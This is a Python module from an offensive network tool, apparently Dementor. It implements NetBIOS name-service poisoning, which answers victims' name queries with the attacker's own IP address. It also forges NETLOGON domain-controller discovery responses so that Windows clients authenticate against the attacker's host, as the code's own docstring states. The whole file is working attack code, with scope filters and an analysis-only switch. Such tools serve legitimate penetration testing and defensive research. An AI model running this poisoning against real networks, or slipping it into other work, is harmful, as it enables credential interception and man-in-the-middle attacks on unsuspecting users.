# Copyright (c) 2025-Present MatrixEditor
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
# pyright: reportUninitializedInstanceVariable=false
import secrets
import socket
import traceback
import typing

from typing_extensions import override
from scapy.layers import netbios, smb
from rich import markup

from dementor.loader import BaseProtocolModule
from dementor.log.stream import log_to
from dementor.servers import BaseProtoHandler, ThreadingUDPServer
from dementor.log.logger import ProtocolLogger
from dementor.config.session import TomlConfig
from dementor.config.toml import Attribute as A
from dementor.filters import ATTR_BLACKLIST, ATTR_WHITELIST, in_scope
from dementor.protocols import mailslot, netlogon

if typing.TYPE_CHECKING:
    from dementor.filters import Filters

__proto__ = ["NetBIOS", "Browser"]


class NBTNSConfig(TomlConfig):
    _section_ = "NetBIOS"
    _fields_ = [ATTR_WHITELIST, ATTR_BLACKLIST]

    if typing.TYPE_CHECKING:
        targets: Filters | None
        ignored: Filters | None


class BrowserConfig(TomlConfig):
    _section_ = "Browser"
    _fields_ = [
        A("browser_domain_name", "DomainName", "CONTOSO"),
        A("browser_hostname", "Hostname", "DC01"),
        ATTR_WHITELIST,
        ATTR_BLACKLIST,
    ]

    if typing.TYPE_CHECKING:
        browser_domain_name: str
        browser_hostname: str
        targets: Filters | None
        ignored: Filters | None


# Scapy _NETBIOS_SUFFIXES is not complete, See:
# http://www.pyeung.com/pages/microsoft/winnt/netbioscodes.html
# _NETBIOS_SUFFIXES = {
#     # Unique (U):
#     0x4141: "Workstation",
#     0x4141 + 0x01: "Messenger Service",
#     0x4141 + 0x03: "Messenger Service",
#     0x4141 + 0x06: "RAS Server Service",
#     0x4141 + 0x1B: "Exchange MTA",
#     0x4141 + 0x1F: "NetDDE Service",
#     0x4141 + 0x20: "File Server Service",
#     0x4141 + 0x21: "RAS Client Service",
#     0x4141 + 0x22: "Exchange Interchange Service",
#     0x4141 + 0x23: "Exchange Store",
#     0x4141 + 0x24: "Exchange Directory",
#     0x4141 + 0x30: "Modern Sharing Server Service",
#     0x4141 + 0x31: "Modern Sharing Client Service",
#     0x4141 + 0x43: "SMS Client Remote Control",
#     0x4141 + 0x44: "SMS Admin Remote Control Tool",
#     0x4141 + 0x45: "SMS Client Remote Chat",
#     0x4141 + 0x46: "SMS Client Remote Transfer",
#     0x4141 + 0x4C: "DEC Pathworks TCP/IP Service",
#     0x4141 + 0x52: "DEC Pathworks TCP/IP Service",
#     0x4141 + 0x6A: "Exchange IMC",
#     0x4141 + 0x87: "Exchange MTA",
#     0x4141 + 0xBE: "Network Monitor Agent",
#     0x4141 + 0xBF: "Network Monitor Apps",
# }


class NetBiosNSPoisoner(BaseProtoHandler):
    def proto_logger(self):
        return ProtocolLogger(
            extra={
                "protocol": "NetBIOS",
                "protocol_color": "gold3",
                "host": self.client_host,
                "port": 137,
            }
        )

    def handle_data(self, data: bytes, transport) -> None:
        header = netbios.NBNSHeader(data)
        if header.RESPONSE:
            # response sent by server, ignore
            return

        if header.OPCODE == 0x0:
            # name query --> this is what we are looking for
            if header.haslayer(netbios.NBNSNodeStatusRequest):
                # we should  handle those too
                return

            if not header.haslayer(netbios.NBNSQueryRequest):
                self.logger.display(
                    f"Not a name query, ignoring... ({markup.escape(repr(header))})"
                )
                return

            request = header[netbios.NBNSQueryRequest]
            suffix = netbios._NETBIOS_SUFFIXES.get(
                request.SUFFIX,
                hex(request.SUFFIX - 0x4141),
            )
            qrtype = netbios._NETBIOS_QRTYPES.get(
                request.QUESTION_TYPE,
                request.QUESTION_TYPE,
            )
            name = request.QUESTION_NAME.decode("utf-8", errors="replace")

            self.logger.display(
                f"Name Query: \\\\{markup.escape(name)} ({suffix}) (qtype: {qrtype})"
            )
            log_to("dns", type="NETBIOS", name=name)
            if self.config.analysis:
                # Analyze-only mode
                return

            # send answer if in scopre
            if not in_scope(name, self.config.netbiosns_config) or not in_scope(
                self.client_host, self.config.netbiosns_config
            ):
                return

            answer = self.build_answer(request, header.NAME_TRN_ID)
            transport.sendto(answer.build(), self.client_address)
            self.logger.success(f"Sent poisoned answer to {self.client_host}")

    def build_answer(self, request, trn_id):
        # simply put our IPv4 address into the answer section
        response = netbios.NBNSHeader() / netbios.NBNSQueryResponse(
            RR_NAME=request.QUESTION_NAME,
            SUFFIX=request.SUFFIX,
            ADDR_ENTRY=[netbios.NBNS_ADD_ENTRY(NB_ADDRESS=self.config.ipv4)],
        )

        response.NAME_TRN_ID = trn_id
        return response


# Unfortunately, Scapy does not define the ServerType flags for [MS-BRWS]. See:
# https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rap/2258bd8d-f17b-45a9-a75e-3e770bc3ad07
_BWRS_SERVER_TYPES = {
    (1 << 0): "Workstation",  # SV_TYPE_WORKSTATION
    (1 << 1): "Server",  # SV_TYPE_SERVER
    (1 << 2): "SQL Server",  # SV_TYPE_SQLSERVER
    (1 << 3): "Domain Controller",  # SV_TYPE_DOMAIN_CTRL
    (1 << 4): "Backup Domain Controller",  # SV_TYPE_DOMAIN_BAKCTRL
    (1 << 5): "Time Source",  # SV_TYPE_TIME_SOURCE
    (1 << 6): "Apple File Protocol Server",  # SV_TYPE_AFP
    (1 << 7): "Novell Server",  # SV_TYPE_NOVELL
    (1 << 8): "Domain Member",  # SV_TYPE_DOMAIN_MEMBER
    (1 << 9): "Print Queue Server",  # SV_TYPE_PRINTQ_SERVER
    (1 << 10): "Dial-in Server",  # SV_TYPE_DIALIN_SERVER
    (1 << 11): "XENIX / UNIX Server",  # SV_TYPE_XENIX
    (1 << 12): "NT Workstation",  # SV_TYPE_NT
    (1 << 13): "WFW Server",  # SV_TYPE_WFW
    (1 << 14): "NetWare",  # SV_TYPE_SERVER_MFPN
    (1 << 15): "NT Server",  # SV_TYPE_NT_SERVER
    (1 << 16): "Browser Server",  # SV_TYPE_POTENTIAL_BROWSER
    (1 << 17): "Backup Browser Server",  # SV_TYPE_BACKUP_BROWSER
    (1 << 18): "Master Browser Server",  # SV_TYPE_MASTER_BROWSER
    (1 << 19): "Domain Master Browser Server",  # SV_TYPE_DOMAIN_MASTER
    (1 << 20): "W9indows95+",  # SV_TYPE_WINDOWS
    (1 << 21): "DFS",  # SV_TYPE_DFS
    (1 << 22): "Server Clusters",  # SV_TYPE_CLUSTER_NT
    (1 << 23): "Terminal Server",  # SV_TYPE_TERMINAL_SERVER
    (1 << 24): "Virtual Server Clusters",  # SV_TYPE_CLUSTER_VS_NT
    (1 << 25): "IBM DSS",  # SV_TYPE_DCE
    # other flags are not relevant here
}

# ============================================================================
# NETLOGON Mailslot Ping Protocol Implementation
# ============================================================================
# The following classes implement the NETLOGON mailslot ping protocol
# Based on [MS-ADTS] section 6.3.5 - Mailslot Ping
# Used for domain controller discovery and verification

# [MS-ADTS] 6.3.1.3 - NETLOGON Operation Codes
_NETLOGON_OPCODES = {
    0x07: "LOGON_PRIMARY_QUERY",
    0x12: "LOGON_SAM_LOGON_REQUEST",
    0x13: "LOGON_SAM_LOGON_RESPONSE",
    0x14: "LOGON_SAM_PAUSE_RESPONSE",
    0x15: "LOGON_SAM_USER_UNKNOWN",
    0x16: "LOGON_SAM_LOGON_RESPONSE_EX",
    0x17: "LOGON_PRIMARY_RESPONSE",
}


class BrowserPoisoner(BaseProtoHandler):
    def proto_logger(self) -> ProtocolLogger:
        return ProtocolLogger(
            extra={
                "protocol": "Browser",
                "protocol_color": "light_goldenrod3",
                "host": self.client_host,
                "port": 138,
            }
        )

    def get_browser_server_types(self, server_type: int) -> list[str]:
        mask = 1
        value = server_type
        server_types = []
        while value > 0:
            if value & 1 and mask in _BWRS_SERVER_TYPES:
                server_types.append(_BWRS_SERVER_TYPES[mask])
            mask <<= 1
            value >>= 1

        return server_types

    @override
    def handle_data(self, data: bytes, transport) -> None:  # ty:ignore[invalid-method-override]
        # we're just her to inspect packets, no poisoning
        try:
            datagram = netbios.NBTDatagram(data)

            if not datagram.haslayer(smb.SMB_Header):
                # probably something else, ignore that
                return
        except Exception:
            self.logger.fail("Invalid NBTDatagram - discarding data...")
            return

        source_name: str = datagram.SourceName.decode("utf-8", errors="replace")
        transaction: smb.SMBMailslot_Write = datagram[smb.SMBMailslot_Write]
        slot_name: str = transaction.Name.decode("utf-8", errors="replace")

        # Route to appropriate mailslot handler
        # MS-ADTS 6.3.5 - NETLOGON mailslot for DC discovery
        if slot_name == mailslot.MAILSLOT_NETLOGON:
            self.handle_netlogon(transaction.Data, transport)
            return

        # Handle both BROWSE and LANMAN mailslots (MS-BRWS 2.1)
        if slot_name not in (mailslot.MAILSLOT_BROWSE, mailslot.MAILSLOT_LANMAN):
            self.logger.display(
                f"Received request for new slot: {markup.escape(slot_name)}"
            )
            return

        buffer = transaction.Buffer
        if len(buffer) < 1 or len(buffer[0]) != 2:
            return

        brws: smb.BRWS = transaction.Buffer[0][1]
        match brws.OpCode:
            case 0x01:  # announcement
                source_types = self.get_browser_server_types(brws.ServerType)
                if len(source_types) > 3:
                    # REVISIT: maybe add complete logging output if --debug is active
                    # source_types = source_types[:3] + ["..."]
                    pass

                fmt_source_types = ", ".join([f"[b]{t}[/b]" for t in source_types])
                source_version = f"{brws.OSVersionMajor}.{brws.OSVersionMinor}"
                self.logger.display(
                    f"HostAnnouncement: [i]{markup.escape(source_name)}[/i] (Version: "
                    + f"[bold blue]{source_version}[/bold blue]) "
                    + f"({fmt_source_types})"
                )

            case _:
                # TODO: add support for more entries here
                pass

    def parse_nt_version_flags(self, nt_version: int) -> dict[str, str]:
        """
        Parse NtVersion bitfield into human-readable flags (MS-ADTS 6.3.1.1).

        Args:
            nt_version: NtVersion field from NETLOGON request

        Returns:
            Dictionary mapping flag names to descriptions

        """
        flags: dict[str, str] = {}
        flag_definitions = {
            "V1": (netlogon.NETLOGON_NT_VERSION_1, "Version 1 support"),
            "V5": (netlogon.NETLOGON_NT_VERSION_5, "Version 5 support"),
            "V5EX": (netlogon.NETLOGON_NT_VERSION_5EX, "Extended version 5"),
            "V5EX_WITH_IP": (
                netlogon.NETLOGON_NT_VERSION_5EX_WITH_IP,
                "Extended v5 with IP",
            ),
            "PDC": (netlogon.NETLOGON_NT_VERSION_PDC, "PDC query"),
            "LOCAL": (netlogon.NETLOGON_NT_VERSION_LOCAL, "Local query"),
            "AVOID_NT4EMUL": (
                netlogon.NETLOGON_NT_VERSION_AVOID_NT4EMUL,
                "Avoid NT4 emulation",
            ),
        }

        for name, (bit, description) in flag_definitions.items():
            if nt_version & bit:
                flags[name] = description

        return flags

    def handle_netlogon(self, request: smb.NETLOGON, transport: socket.socket) -> None:
        """
        Handle NETLOGON mailslot ping requests (MS-ADTS 6.3.5).

        Mailslot pings are used by Windows clients to:
        - Discover domain controllers
        - Verify PDC availability
        - Validate user accounts
        - Map domain structure
        """
        opcode: int = request.OpCode
        opcode_name = smb._NETLOGON_opcodes.get(opcode, f"Unknown({hex(opcode)})")
        match opcode:
            case 0x12:  # LOGON_SAM_LOGON_REQUEST
                # Decode Unicode strings (UTF-16LE encoded)
                computer_name = request.UnicodeComputerName.rstrip("\x00")
                user_name = (
                    request.UnicodeUserName.rstrip("\x00")
                    if getattr(request, "UnicodeUserName", None)
                    else None
                )
                mailslot_name = request.MailslotName.decode(
                    "utf-8", errors="replace"
                ).rstrip("\x00")

                # Parse NtVersion flags
                nt_version = request.NtVersion
                version_flags = self.parse_nt_version_flags(nt_version)
                version_str = "|".join(version_flags.keys()) if version_flags else ""

                # Display parsed information
                text = f"[bold]DC Discovery[/bold] from [i]{markup.escape(computer_name)}[/i]"
                if user_name:
                    text = f"{text} (user: [b]{markup.escape(user_name)}[/])"
                if version_str:
                    text = f"{text} (version: {version_str})"
                if mailslot_name:
                    text = f"{text} (mailslot: [b]{markup.escape(mailslot_name)}[/])"

                self.logger.display(text)
                # Analysis-only mode - don't respond
                if self.config.analysis or not in_scope(
                    self.client_host, self.config.netbiosns_config
                ):
                    return

                # Build and send LOGON_SAM_LOGON_RESPONSE (MS-ADTS 6.3.5.2)
                response = self.build_dc_response(request, mailslot_name)
                if response:
                    transport.sendto(response, self.client_address)
                    self.logger.success(
                        f"Sent DC discovery response to {markup.escape(computer_name)} ({self.client_host})"
                    )

            case 0x07:  # LOGON_PRIMARY_QUERY
                # Extract request parameters
                computer_name = getattr(request, "ComputerName", b"")
                if isinstance(computer_name, bytes):
                    computer_name = computer_name.decode("ascii", errors="replace")
                computer_name = computer_name.rstrip("\x00")

                mailslot_name = getattr(request, "MailslotName", b"")
                if isinstance(mailslot_name, bytes):
                    mailslot_name = mailslot_name.decode("ascii", errors="replace")
                mailslot_name = mailslot_name.rstrip("\x00")

                # Display parsed information
                text = (
                    f"[bold]PDC Query[/bold] from [i]{markup.escape(computer_name)}[/i]"
                )
                if mailslot_name:
                    text = f"{text} (mailslot: [b]{markup.escape(mailslot_name)}[/])"

                self.logger.display(text)
                # Analysis-only mode - don't respond
                if self.config.analysis or not in_scope(
                    self.client_host, self.config.netbiosns_config
                ):
                    return

                # Build and send LOGON_PRIMARY_RESPONSE
                response = self.build_dc_response(request, mailslot_name)
                if response:
                    transport.sendto(response, self.client_address)
                    self.logger.success(
                        f"Sent PDC response to {markup.escape(computer_name)} ({self.client_host})"
                    )

            case _:
                # Display information about other NETLOGON opcodes
                self.logger.display(
                    f"NETLOGON {opcode_name} from [i]{self.client_host}[/i]"
                )

    def build_dc_response(
        self,
        request: smb.NETLOGON_SAM_LOGON_REQUEST | smb.NETLOGON_LOGON_QUERY,
        mailslot_name: str,
    ) -> bytes | None:
        """Build a LOGON_SAM_LOGON_RESPONSE_EX per MS-ADTS 6.3.5.

        The response is sent as a mailslot write message per MS-MAIL 2.2.1,
        wrapped in an NBT datagram per RFC1001/1002.

        This response makes the attacker appear as a valid DC, potentially
        causing clients to attempt authentication against the poisoned server.

        :param request: The LOGON_SAM_LOGON_REQUEST packet from the client
        :type request: smb.NETLOGON_SAM_LOGON_REQUEST
        :param mailslot_name: The mailslot to respond to (from request)
        :type mailslot_name: str
        :return: Raw bytes of the NBT datagram, or None on error
        :rtype: bytes | None
        """
        try:
            # ==================================================================
            # Extract request parameters
            # ==================================================================
            domain_name = self.config.browser_config.browser_domain_name
            computer_name: str | bytes = getattr(request, "ComputerName", b"")
            if not computer_name:
                computer_name = request.UnicodeComputerName
                if isinstance(computer_name, bytes):
                    computer_name = computer_name.decode("utf-16le")

            if isinstance(computer_name, bytes):
                computer_name = computer_name.decode("ascii")

            computer_name = computer_name.rstrip("\x00")
            # Get hostname from configuration
            dc_name = self.config.browser_config.browser_hostname
            dc_netbios = dc_name.upper()[:15]  # NetBIOS names are max 15 chars
            dc_fqdn = f"{dc_name}.{domain_name.lower()}"

            # ==================================================================
            # Build DC flags per MS-ADTS 6.3.1.2 (DS_FLAG Options Bits)
            # ==================================================================
            dc_flags = (
                netlogon.DS_PDC_FLAG
                | netlogon.DS_DS_FLAG
                | netlogon.DS_KDC_FLAG
                | netlogon.DS_TIMESERV_FLAG
                | netlogon.DS_CLOSEST_FLAG
                | netlogon.DS_GOOD_TIMESERV_FLAG
                | netlogon.DS_DNS_CONTROLLER_FLAG
                | netlogon.DS_DNS_DOMAIN_FLAG
                | netlogon.DS_DNS_FOREST_FLAG
            )

            # ==================================================================
            # Build NETLOGON_SAM_LOGON_RESPONSE_EX per MS-ADTS 6.3.1.9
            # Scapy handles DNS compression automatically per RFC1035
            # ==================================================================
            netlogon_response = netlogon.build_response(
                request=request,
                dc_name=dc_netbios,
                domain_name=domain_name.upper(),
                dns_forest_name=domain_name.lower(),
                dns_domain_name=domain_name.lower(),
                dns_host_name=dc_fqdn,
                dc_ip_address=self.config.ipv4,
                flags=dc_flags,
            )
            # Encode NetBIOS names (pad to 16 bytes with spaces, last byte is type)
            source_nb_name = dc_netbios.ljust(15) + "\x00"
            dest_nb_name = computer_name.upper()[:15].ljust(15) + "\x00"

            nbt_datagram = mailslot.mailslot_write(
                mailslot_name=mailslot_name,
                data=bytes(netlogon_response),
                source_name=source_nb_name,
                destination_name=dest_nb_name,
                source_ip=self.config.ipv4,
            )
            return bytes(nbt_datagram)

        except Exception as e:
            self.logger.fail(f"Failed to build DC response: {e}")
            self.logger.debug(traceback.format_exc())
            return None


class NetBiosNSServer(ThreadingUDPServer):
    default_port = 137  # name service
    default_handler_class = NetBiosNSPoisoner
    ipv4_only = True
    service_name = "NetBIOS-NS"


class NetBIOS(BaseProtocolModule[NBTNSConfig]):
    name: str = "NetBIOS"
    config_ty = NBTNSConfig
    config_attr = "netbiosns_config"
    config_enabled_attr = "nbtns_enabled"
    server_ty = NetBiosNSServer
    poisoner = True


class BrowserServer(ThreadingUDPServer):
    default_port = 138  # datagram service
    default_handler_class = BrowserPoisoner
    ipv4_only = True
    service_name = "Browser"


class Browser(BaseProtocolModule[BrowserConfig]):
    name: str = "Browser"
    config_ty = BrowserConfig
    config_attr = "browser_config"
    config_enabled_attr = "nbtds_enabled"
    server_ty = BrowserServer
